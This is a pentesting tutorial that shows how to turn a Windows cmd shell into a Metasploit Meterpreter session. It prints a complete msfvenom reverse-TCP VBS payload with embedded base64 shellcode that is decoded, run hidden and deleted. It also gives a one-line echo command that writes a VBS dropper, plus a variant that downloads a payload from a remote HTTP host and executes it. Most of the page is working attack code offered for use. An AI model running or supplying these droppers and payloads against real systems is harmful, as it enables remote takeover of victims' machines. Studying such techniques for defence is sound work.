
## Execute metasploit vbs payload in cmd shell

If you are a pentester/researcher,  you may want to gain a meterpreter session from a cmd shell at sometimes, ex: (sqlmap --os-shell, or other tools). Ex:

```
$ ncat -l -p 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.  

C:\Documents and Settings\test\Desktop>ver
ver  

Microsoft Windows XP [Version 5.1.2600]
C:\Documents and Settings\test\Desktop>
```

In the previous, you want try the following methods:

  - a. translate exe into a batch script.
  - b. download the payload file from remote server (ftp, tftp, http, ....)
  - c. ....

Now, I'll show you how to run metasploit payload in cmd.exe.  Please try to think about the following questions:

1. How to generate a  payload with msfvenom ?
2. How to run  payload in a simple/compatible way ?

----

## How to generate a  payload with msfvenom ?

In order to test the payload on Windows XP/2003,  we choose the vbs format . If you need help, please try [msfvenom -h]

```
$ msfvenom -p windows/meterpreter/reverse_tcp
 LHOST=192.168.1.100 LPORT=4444 -f vbs --arch x86 --platform win

 No encoder or badchars specified, outputting raw payload
 Payload size: 333 bytes
 Final size of vbs file: 7370 bytes
 Function oSpLpsWeU(XwXDDtdR)
  urGQiYVn = "" & _           
  XwXDDtdR & ""      
  Set gFMdOBBiLZ = CreateObject("MSXML2.DOMDocument.3.0")
  gFMdOBBiLZ.LoadXML(urGQiYVn)
  oSpLpsWeU = gFMdOBBiLZ.selectsinglenode("B64DECODE").nodeTypedValue
  set gFMdOBBiLZ = nothing
 End Function

 Function skbfzWOqR()
  cTENSbYbnWY = "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"
  Dim GBHMAfCsea
  Set GBHMAfCsea = CreateObject("Scripting.FileSystemObject")
  Dim nYosrMtHSIOKSTI
  Dim LNXsqHXEKZQU
  Set nYosrMtHSIOKSTI = GBHMAfCsea.GetSpecialFolder(2)
  LNXsqHXEKZQU = nYosrMtHSIOKSTI & "\" & GBHMAfCsea.GetTempName()
  GBHMAfCsea.CreateFolder(LNXsqHXEKZQU)
  YeQZhbvaLPekFW = LNXsqHXEKZQU & "\" & "QoziwORKliqRDPs.exe"
  Dim voFeIDpffjdo
  Set voFeIDpffjdo = CreateObject("Wscript.Shell")
  WwqoNcaCIbw = oSpLpsWeU(cTENSbYbnWY)
  Set WQwWDbhse = CreateObject("ADODB.Stream")
  WQwWDbhse.Type = 1
  WQwWDbhse.Open
  WQwWDbhse.Write WwqoNcaCIbw
  WQwWDbhse.SaveToFile YeQZhbvaLPekFW, 2
  voFeIDpffjdo.run YeQZhbvaLPekFW, 0, true
  GBHMAfCsea.DeleteFile(YeQZhbvaLPekFW)
  GBHMAfCsea.DeleteFolder(LNXsqHXEKZQU)
End Function

skbfzWOqR
```

## How to run  payload in a simple/compatible way ?

Read the code, we can create a simple vbs script called msf.vbs to execute the shellcode. A vbs script can be executed on Windows XP/2003/Vista/7/8/10/2008/2012/....

```
shellcode = WScript.Arguments.Item(0)
strXML = "" & shellcode & ""
Set oXMLDoc = CreateObject("MSXML2.DOMDocument.3.0")
oXMLDoc.LoadXML(strXML) decode = oXMLDoc.selectsinglenode("B64DECODE").nodeTypedValue
set oXMLDoc = nothing
 Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tempdir
Dim basedir
Set tempdir = fso.GetSpecialFolder(2)
basedir = tempdir & "\" & fso.GetTempName()
fso.CreateFolder(basedir)
tempexe = basedir & "\" & "test.exe"
Dim adodbstream
Set adodbstream = CreateObject("ADODB.Stream")
adodbstream.Type = 1
adodbstream.Open
adodbstream.Write decode
adodbstream.SaveToFile tempexe, 2
Dim wshell
Set wshell = CreateObject("Wscript.Shell")
wshell.run tempexe, 0, true
fso.DeleteFile(tempexe)
fso.DeleteFolder(basedir)

Ok, how to run it in cmd.exe ? Do you want  to paste the code line by line ?  A simple command is created as follow:

```

upload msf.vbs to vuln lab with a single command,

```
echo shellcode = WScript.Arguments.Item(0):strXML = ^"^^" ^& shellcode ^& ^"^<^/B64DECODE^>^":Set oXMLDoc = CreateObject(^"MSXML2.DOMDocument.3.0^"):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^"B64DECODE^").nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^"Scripting.FileSystemObject^"):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^& ^"\^" ^& fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^& ^"\^" ^& ^"test.exe^":Dim adodbstream:Set adodbstream = CreateObject(^"ADODB.Stream^"):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^"Wscript.Shell^"):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir) > %TEMP%\msf.vbs
```

execute metasploit payload with msf.vbs and cscript.exe

```
C:\Documents and Settings\test\Desktop> cscript.exe msf.vbs <msf-vbs-shellcode>
```

![](msf-execute-vbs-payload.png)


## Bypass nc shell buffer size limit

If the script is used in cmd.exe on localhost, everything goes well. But if it is used in netcat cmd shell, the payload will be broken. ex:

```
C:\Documents and Settings\test\Desktop>cscript.exe %TEMP%\msf.vbs TVqQAAMAA.....AAAAAP

Microsoft (R) Windows Script Host Version 5.7
Copyright (C) Microsoft Corporation. All rights reserved.

C:\DOCUME~1\test\LOCALS~1\Temp\msf.vbs(1, 53) Microsoft VBScript compilation error: Syntax error
```

- origin payload size: 6160
- netcat handle payload size: 4068

Pleae try it yourself, For security tests, another vbs script is created.

```
echo strFileURL = WScript.Arguments.Item(0):Set objXMLHTTP = CreateObject(^"MSXML2.XMLHTTP^"):objXMLHTTP.open ^"GET^", strFileURL, false:objXMLHTTP.send():shellcode = objXMLHTTP.responseText:strXML = ^"^<B64DECODE xmlns:dt=^" ^& Chr(34) ^& ^"urn:schemas-microsoft-com:datatypes^" ^& Chr(34) ^& ^" ^" ^& ^"dt:dt=^" ^& Chr(34) ^& ^"bin.base64^" ^& Chr(34) ^& ^"^>^" ^& shellcode ^& ^"^<^/B64DECODE^>^":Set oXMLDoc = CreateObject(^"MSXML2.DOMDocument.3.0^"):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^"B64DECODE^").nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^"Scripting.FileSystemObject^"):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^& ^"\^" ^& fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^& ^"\^" ^& ^"test.exe^":Dim adodbstream:Set adodbstream = CreateObject(^"ADODB.Stream^"):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^"Wscript.Shell^"):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir):Set fso = Nothing > %TEMP%\msf.vbs
```

Run the following command to execute your vbs payload:

```
START /B cscript.exe %TEMP%\msf.vbs http://192.168.1.100:8080/payload.txt
```

![](msf-download-execute-vbs-payload.png)


## References

1. https://github.com/nixawk/psmsf/blob/master/vbsmsf.bat
2. http://stackoverflow.com/questions/3205027/maximum-length-of-command-line-string
3. https://operatingquadrant.com/2009/09/11/vbs-decoding-base64-strings-in-10-lines-of-code/
4. https://social.technet.microsoft.com/Forums/systemcenter/en-US/b8839003-0a8f-4d41-a04a-f09f79103d0e/scom-sp1-groups-classes-and-snmp?forum=operationsmanagerauthoring
5. http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html
6. http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html
7. https://github.com/rapid7/metasploit-framework/blob/c00df4dd712bbc4cfbb9f46d963eb0490094b4de/modules/exploits/windows/misc/regsvr32_applocker_bypass_server.rb
